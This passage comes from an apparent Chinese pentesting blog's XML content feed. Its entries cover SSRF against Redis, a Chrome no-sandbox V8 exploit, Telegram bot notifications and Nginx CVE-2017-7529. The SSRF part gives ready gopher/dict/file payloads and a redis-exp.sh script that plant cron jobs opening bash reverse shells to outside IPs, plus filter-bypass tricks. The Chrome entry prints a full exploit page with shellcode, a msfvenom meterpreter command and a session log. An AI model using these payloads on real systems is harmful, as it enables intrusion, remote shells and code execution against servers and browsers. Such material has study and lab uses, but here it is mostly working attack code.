8%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%61%6c%74%3d%70%72%6f%74%6f    ❯ nc -lvv 70    POST /v1/pages HTTP/2    Host: content-autofill.googleapis.com    X-Goog-Encode-Response-If-Executable: base64    X-Goog-Api-Key: dummytoken    X-Client-Data: COrfygE=    Sec-Fetch-Site: none    Sec-Fetch-Mode: no-cors    Sec-Fetch-Dest: empty    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36    Accept-Encoding: gzip, deflate    Accept-Language: en-US,en;q=0.9    Connection: close    Content-Type: application/x-www-form-urlencoded    Content-Length: 9    alt=proto</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="Kali/Exploit/SSRF.html"/>
      <url>Kali/Exploit/SSRF.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>靶机环境 <a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p><p><a href="https://github.com/hongriSec/Web-Security-Attack">https://github.com/hongriSec/Web-Security-Attack</a></p><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a></p><p><a href="https://my.oschina.net/u/4588149/blog/4436524">https://my.oschina.net/u/4588149/blog/4436524</a></p><p><a href="https://www.anquanke.com/post/id/197431">https://www.anquanke.com/post/id/197431</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p><a href="https://segmentfault.com/a/1190000021960060">https://segmentfault.com/a/1190000021960060</a></p><p>https://<em>thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de</em>.html</p><p><a href="https://my.oschina.net/u/4588149/blog/4436524">https://my.oschina.net/u/4588149/blog/4436524</a></p><p>能发起对外请求且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）</p><p><a href="https://joner11234.github.io/article/9d7d2c7d.html">https://joner11234.github.io/article/9d7d2c7d.html</a></p><p><a href="https://joner11234.github.io/article/9897b513.html">https://joner11234.github.io/article/9897b513.html</a></p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>工具 ：<a href="http://xip.io/">http://xip.io/</a><br><a href="http://xip.name/">http://xip.name</a></p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>请求中常用参数share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p><p><img src="https://raw.githubusercontent.com/crkmythical/Advanced-Ethical-Hacking-Training/main/Resource/img/20210419144323urlencode_all.png?token=ATXUKW6VO2E3WA5DV2YM6ITAPUTNK" alt="SSRF"></p><pre><code class="zsh"># dict protocol (操作Redis)curl -vvv &#39;dict://127.0.0.1:6379/info&#39;# file protocol (任意文件读取)curl -vvv &#39;file:///etc/passwd&#39;# gopher protocol (一键反弹Bash)   * 注意: 链接使用单引号，避免$变量问题curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</code></pre><h2 id="协议使用"><a href="#协议使用" class="headerlink" title="协议使用"></a>协议使用</h2><p>（1）file： 在有回显的情况下，利用 file 协议可以读取任意内容</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&#39;</code></pre><p>（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/&#39;</code></pre><p>（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。</p><p>反弹shell脚本<code>redis-exp.sh</code></p><pre><code class="zsh">redis-cli -h $1 flushallecho -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.43.20/7777 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save</code></pre><p>在本级上上运行socat查看执行的命令</p><pre><code class="zsh">socat -v tcp-listen:4444,fork tcp-connect:10.211.55.4:6379   # 10.211.55.4 为目标机sh redis-exp.sh</code></pre><p>socat会输出 redis-exp 执行的内容</p><pre><code class="zsh">*3\r$3\rset\r$1\r1\r$65\r-e */1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.43.26/7777 0&gt;&amp;1\r*4\r$6\rconfig\r$3\rset\r$3\rdir\r$16\r/var/spool/cron/\r*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$4\rroot\r*1\r$4\rsave\r*1\r$4\rquit\r^C%                       ``````zshcurl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39;</code></pre><p>（4）http/s：探测内网主机存活</p><pre><code class="zsh">curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1&#39;</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><ul><li><input disabled="" type="checkbox"> 针对<code>Host</code></li></ul><pre><code class="zsh">1. http://www.target.com@10.10.10.10  -&gt;10.10.10.102. http://10.10.10.10#www.target.com  -&gt;10.10.10.103. 10。10。10。10                     -&gt; 10.10.10.103. xip.io &amp; xip.name4. tinyurl.com6. ip编码绕过7. [DNS Rebinding](https://github.com/Tr3jer/dnsAutoRebinding)</code></pre><h2 id="SSRF探测内网Redis服务-burp-intruder"><a href="#SSRF探测内网Redis服务-burp-intruder" class="headerlink" title="SSRF探测内网Redis服务(burp intruder)"></a>SSRF探测内网Redis服务(burp intruder)</h2><ol><li><p> 利用http协议对内网进行探测，探测整个内网的存活ip， <code>curl http://www.target.com/ssrf.php?url=http://172.16.x.x</code></p></li><li><p> 利用dict协议获取存活ip的6379端口banner信息 <code>curl http://www.target.com/ssrf.php?url=dict://172.16.55.23:6379/info</code></p></li><li><p>利用crontab写计划任务</p><ol><li><p>URL全编码以下payload</p><pre><code class="zsh">testset 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\n\n\n\n&quot;config set dir /var/spool/root     config set dbfilename crontabsaveaaa</code></pre></li><li><p>使用gopher协议发送payload</p><p>```zsh<br>curl <a href="http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E&%20/dev/tcp/lQip/%EF%BF%BD,%EF%BF%BD%EF%BF%BD%200%3E&1%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20/tmp%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa">http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_%74%65%73%74%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%72%6f%6f%74%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%6c%51%69%70%2f%d1%2c%ef%e3%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%74%6d%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65%0d%0a%0d%0a%61%61%61</a></p></li></ol><p> +OK<br> +OK<br> +OK<br> +OK</p><pre><code>2.  通过[Gopherus](https://github.com/tarunkant/Gopherus)生成RESP格式的payload```zshpython gopherus.py --exploit redisYour gopher link is ready to get Reverse Shell:gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0ABefore sending request plz do `nc -lvp 1234`</code></pre></li></ol><p>工具<br><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a><br><a href="https://github.com/cujanovic/SSRF-Testing">SSRF-Testing</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Chrome_0day_RCE_no_sandbox</title>
      <link href="Kali/Exploit/Chrome-0day-RCE-no-sandbox.html"/>
      <url>Kali/Exploit/Chrome-0day-RCE-no-sandbox.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="exp-html-sample"><a href="#exp-html-sample" class="headerlink" title="exp.html sample"></a>exp.html sample</h2><pre><code class="javascript">&lt;script&gt;   function gc() &#123;       for (var i = 0; i &lt; 0x80000; ++i) &#123;           var a = new ArrayBuffer();      &#125;  &#125;  // replace the shellcode with cs&#39;payload generate as c format    let shellcode = [          0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,       0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,       0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,       0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,       0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,       0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,       0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,       0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,       0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,       0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,       0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,       0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,       0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,       0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,       0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,       0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,       0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,       0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00       ];   var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);   var wasmModule = new WebAssembly.Module(wasmCode);   var wasmInstance = new WebAssembly.Instance(wasmModule);   var main = wasmInstance.exports.main;   var bf = new ArrayBuffer(8);   var bfView = new DataView(bf);   function fLow(f) &#123;       bfView.setFloat64(0, f, true);       return (bfView.getUint32(0, true));  &#125;   function fHi(f) &#123;       bfView.setFloat64(0, f, true);       return (bfView.getUint32(4, true))  &#125;   function i2f(low, hi) &#123;       bfView.setUint32(0, low, true);       bfView.setUint32(4, hi, true);       return bfView.getFloat64(0, true);  &#125;   function f2big(f) &#123;       bfView.setFloat64(0, f, true);       return bfView.getBigUint64(0, true);  &#125;   function big2f(b) &#123;       bfView.setBigUint64(0, b, true);       return bfView.getFloat64(0, true);  &#125;   class LeakArrayBuffer extends ArrayBuffer &#123;       constructor(size) &#123;           super(size);           this.slot = 0xb33f;      &#125;  &#125;   function foo(a) &#123;       let x = -1;       if (a) x = 0xFFFFFFFF;       var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));       arr.shift();       let local_arr = Array(2);       local_arr[0] = 5.1;//4014666666666666       let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8       arr[0] = 0x1122;       return [arr, local_arr, buff];  &#125;   for (var i = 0; i &lt; 0x10000; ++i)       foo(false);   gc(); gc();  [corrput_arr, rwarr, corrupt_buff] = foo(true);   corrput_arr[12] = 0x22444;   delete corrput_arr;   function setbackingStore(hi, low) &#123;       rwarr[4] = i2f(fLow(rwarr[4]), hi);       rwarr[5] = i2f(low, fHi(rwarr[5]));  &#125;   function leakObjLow(o) &#123;       corrupt_buff.slot = o;       return (fLow(rwarr[9]) - 1);  &#125;   let corrupt_view = new DataView(corrupt_buff);   let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);   let idx0Addr = corrupt_buffer_ptr_low - 0x10;   let baseAddr = (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;   let delta = baseAddr + 0x1c - idx0Addr;   if ((delta % 8) == 0) &#123;       let baseIdx = delta / 8;       this.base = fLow(rwarr[baseIdx]);  &#125; else &#123;       let baseIdx = ((delta - (delta % 8)) / 8);       this.base = fHi(rwarr[baseIdx]);  &#125;   let wasmInsAddr = leakObjLow(wasmInstance);   setbackingStore(wasmInsAddr, this.base);   let code_entry = corrupt_view.getFloat64(13 * 8, true);   setbackingStore(fLow(code_entry), fHi(code_entry));   for (let i = 0; i &lt; shellcode.length; i++) &#123;       corrupt_view.setUint8(i, shellcode[i]);  &#125;   main();&lt;/script&gt;</code></pre><p>MSF</p><pre><code class="zsh">msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.26 lport=8080 -f csharp &gt; bb.txt</code></pre><p><img src="../images/chrome.jpg" alt="cs-payload"></p><pre><code class="zsh">python -m SimpleHTTPServer 8888/path/to/chrome.exe -no-sandbox </code></pre><p>msf运行</p><pre><code class="zsh">msf6 &gt; handler -H 192.168.43.26 -P 8080 -p windows/x64/meterpreter/reverse_tcp[*] Payload handler running as background job 0.[*] Started reverse TCP handler on 192.168.43.26:8080msf6 &gt; [*] Sending stage (200262 bytes) to 192.168.43.26[*] Meterpreter session 1 opened (192.168.43.26:8080 -&gt; 192.168.43.26:54937) at 2021-04-16 08:52:41 +0800msf6 &gt;msf6 &gt; jobsJobs====  Id  Name                    Payload                              Payload opts  --  ----                    -------                              ------------  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.43.26:8080msf6 &gt; sessionsActive sessions===============  Id  Name  Type                     Information                              Connection  --  ----  ----                     -----------                              ----------  1         meterpreter x64/windows  ETHANHUNTER78BC\ethan @ ETHANHUNTER78BC  192.168.43.26:8080 -&gt; 192.168.43.26:54937 (10.211.55.3)msf6 &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt;</code></pre><p>参考：<br><a href="https://mp.weixin.qq.com/s/LOpAu8vs8ob85W3sCmXMew">Cobalt Strike 利用 Chrome 0day 上线 </a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Telegram</title>
      <link href="Tools/Telegram.html"/>
      <url>Tools/Telegram.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>Telegram（非正式簡稱TG）是跨平台的即時通訊软件</p><h2 id="如何通过电报机器人给自己发消息-类似微信公众号推送消息通知"><a href="#如何通过电报机器人给自己发消息-类似微信公众号推送消息通知" class="headerlink" title="如何通过电报机器人给自己发消息(类似微信公众号推送消息通知)"></a>如何通过电报机器人给自己发消息(类似微信公众号推送消息通知)</h2><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot&lt;token&gt;/sendMessage&quot; -d &quot;chat_id=&lt;chat-id&gt;5&amp;text=&lt;message&gt;&quot;</code></pre><p>所需参数</p><ul><li><p><em><token></em>  机器人token 类似于 1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo</p></li><li><p><em><chat-id></em> 会话id 类似于 509654615</p></li><li><p><em><message></em> 推送内容</p></li><li><p><input disabled="" type="checkbox">  创建Telegram机器人 获取Token (任意聊天窗口发送@BotFather，并点击此字符串即可)</p><pre><code class="zsh">/start/newbot &lt;bot_name&gt;         //机器人名字&lt;user_name&gt;_bot    //机器人ID  输入完毕后返回此机器人的Token 《1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo》Done! Congratulations on your new bot. You will find it at t.me/Bili_auto_checkIn_bot. You can now add a description, about section and profile picture for your bot, see /help for a list of commands. By the way, when you&#39;ve finished creating your cool bot, ping our Bot Support if you want a better username for it. Just make sure the bot is fully operational before you do this.  Use this token to access the HTTP API:  1234567890:AAGRfRacMktFHtM1XSpj477m33RSONKlPWo  Keep your token secure and store it safely, it can be used by anyone to control your bot.  For a description of the Bot API, see this page: https://core.telegram.org/bots/api</code></pre></li><li><p><input disabled="" type="checkbox">  获取会话id (任意聊天窗口发送@userinfo，并点击此字符串)</p><pre><code class="zsh">    @ethan1Id: 509654615  First: Ethan  Last: Hunter  Lang: en</code></pre></li><li><p><input disabled="" type="checkbox">  curl测试推送内容到机器人</p><pre><code class="zsh">curl -X POST &quot;https://api.telegram.org/bot173220123420:AAGRfRacMKAtFHtM1XSpj477mMFRSONKlPWo/sendMessage&quot; -d &quot;chat_id=509654615&amp;text=https://askding.github.io&quot;&#123;  &quot;ok&quot;: true,   &quot;result&quot;: &#123;      &quot;message_id&quot;: 11,       &quot;from&quot;: &#123;          &quot;id&quot;: 17020603330,           &quot;is_bot&quot;: true,           &quot;first_name&quot;: &quot;Bili&quot;,           &quot;username&quot;: &quot;Bili_checkIn_bot&quot;      &#125;,       &quot;chat&quot;: &#123;          &quot;id&quot;: 5096546232,           &quot;first_name&quot;: &quot;Ethan&quot;,           &quot;last_name&quot;: &quot;Hunter&quot;,           &quot;username&quot;: &quot;et7an&quot;,           &quot;type&quot;: &quot;private&quot;      &#125;,       &quot;date&quot;: 1617958429,       &quot;text&quot;: &quot;https://askding.github.io&quot;,       &quot;entities&quot;: [          &#123;              &quot;offset&quot;: 0,               &quot;length&quot;: 25,               &quot;type&quot;: &quot;url&quot;          &#125;      ]  &#125;&#125;</code></pre></li></ul><p>参考<br><a href="https://zhuanlan.zhihu.com/p/146062288">如何通过电报机器人给自己或群组发消息</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginx</title>
      <link href="Kali/Exploit/Nginx.html"/>
      <url>Kali/Exploit/Nginx.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Nginx整数溢出漏洞-CVE-2017-7529"><a href="#Nginx整数溢出漏洞-CVE-2017-7529" class="headerlink" title="Nginx整数溢出漏洞 CVE-2017-7529"></a>Nginx整数溢出漏洞 CVE-2017-7529</h1><p>当使用nginx标准模块时，攻击者可以通过发送包含恶意构造 range 域的 header 请求，来获取响应中的缓存文件头部信息。在某些配置中，缓存文件头可能包含后端服务器的IP地址或其它敏感信息，从而导致信息泄露。</p><p>环境搭建参考 <a href="https://github.com/liusec/CVE-2017-7529">CVE-2017-7529</a></p><pre><code class="zsh">docker pull medicean/vulapps:n_nginx_1docker run -d -p 8000:80 medicean/vulapps:n_nginx_1</code></pre><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li><p>Nginx version 0.5.6 - 1.13.2<br>该漏洞影响所有 0.5.6 - 1.13.2版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。</p></li><li><p>修复版本 Nginx version 1.13.3, 1.12.1</p></li></ul><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul><li>命令行版<pre><code class="zsh">curl -I  http://192.168.43.204:8000/proxy/demo.png -x 127.0.0.1:8080 # 查看文件大小 Content-Length: 16585</code></pre>curl命令用法 请参考<a href="https://askding.github.io/Tools/curl-wget.html">curl-wget</a></li></ul><pre><code class="zsh"></code></pre><p><a href="https://github.com/MaxSecurity/CVE-2017-7529-POC/blob/master/CVE-2017-7529-POC.py">CVE-2017-7259</a></p><h2 id="测试原理"><a href="#测试原理" class="headerlink" title="测试原理"></a>测试原理</h2><p><em>HTTP Range范围请求-响应包</em></p><pre><code class="bash">curl -i   http://192.168.43.204:8000/proxy/demo.png -x 127.0.0.1:8080  -r -17208,-9223372036854758600 </code></pre><pre><code class="http">GET /proxy/demo.png HTTP/1.1                      # HTTP版本必须在1.1及以上版本Host: 192.168.43.204:8000Range: bytes=-17208,-9223372036854758600          # 指定Range字段User-Agent: curl/7.64.1Accept: */*Connection: closeHTTP/1.1 206 Partial Content                     # 表明服务器正确处理了请求并返回Range指定的数据区间Server: nginx/1.13.1Date: Wed, 07 Apr 2021 15:04:48 GMTContent-Type: multipart/byteranges; boundary=00000000000000000025`   # 多个数据区间用multipart/byteranges; boundary标识Connection: closeLast-Modified: Mon, 17 Jul 2017 02:19:08 GMTETag: &quot;40c9-5547a060fdf00&quot;X-Proxy-Cache: HIT--00000000000000000025Content-Type: image/png                          # 指定媒体类型 Content-Range: bytes -623-16584/16585            # 标识返回指定文件的部分内容在整个文件中所处的位置:Ìm`lYâÉm`ä.åä&#123;v&quot;40c9-5547a060fdf00&quot;KEY: httpGET192.168.43.204/proxy/demo.pngHTTP/1.1 200 OKDate: Wed, 07 Apr 2021 15:04:02 GMTServer: Apache/2.4.25 (Debian)Last-Modified: Mon, 17 Jul 2017 02:19:08 GMTETag: &quot;40c9-5547a060fdf00&quot;Accept-Ranges: bytes                           # 表示支持服务器支持范围请求Content-Length: 16585                          # 标识返回指定文件的部分内容在整个文件中所处的位置Content-Type: image/png                        # 指定媒体类型Connection: closePNGIHDRÌ`rB§iCCPICC ProfileHWXSÉ[R    -)¡w¤Wé½H!    J bG\*&quot;XÑUE×È¢&quot;bgìýÊÊºX°¡ò&amp;t&#125;í&#123;&#39;ßÜùsæ3ÿ;@Ñ*Ã/Dù2¤&gt;yøqF,¶0Ï&#39;`@ëÿ.ïnDÜ_³Çú×ñÿ*Ê®%Ja.aQB (Â    M](B (øÿÆHs&amp;*IEND®B`--00000000000000000027Content-Type: image/png                                               # 指定媒体类型Content-Range: bytes -9223372036854742015-16584/16585`                 # 标识返回指定文件的部分内容在整个文件中所处的位置</code></pre><p><em>详解</em></p><ul><li><p><input disabled="" type="checkbox">  状态码</p><ul><li><code>HTTP 206 Partial Content</code>成功状态响应代码表示请求已成功，服务器响应完成且传输了请求指定文件的数据区间，（请求包的 Range 字段指定的，响应包中的<code>Content-Range</code>标识</li><li><code>416 Requested Range Not Satisfiable</code> 表示请求的范围越界（范围值超过了资源的大小）</li><li><code>200 OK</code> 表示服务器不支持范围请求</li></ul></li><li><p><input disabled="" type="checkbox">  HTTP版本要求  需要HTTP/1.1及以上版本支持</p></li><li><p><input disabled="" type="checkbox">  请求包中Range字段 （通过<code>If-Range == 